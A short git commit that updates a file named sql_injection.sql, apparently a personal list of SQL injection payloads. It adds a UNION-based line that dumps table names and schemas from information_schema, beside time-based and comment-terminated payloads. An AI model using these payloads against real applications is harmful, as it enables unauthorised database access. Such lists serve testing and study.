0d4241e2151ef02087f0768570c4fd13a59daed8
espen21 <31931020+espen21@users.noreply.github.com>
2020-11-05 23:30:04 +0100

    Update sql_injection.sql

--- sql_injection.sql
+++ sql_injection.sql
@@ -1,6 +1,6 @@
 SELECT * FROM* WHERE* LIKE '%apple%';--
 SELECT * FROM* WHERE* LIKE "apple" AND 1 = sqlite3_sleep() ; --%
-
+'apple' UNiON (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);--
 
 
 
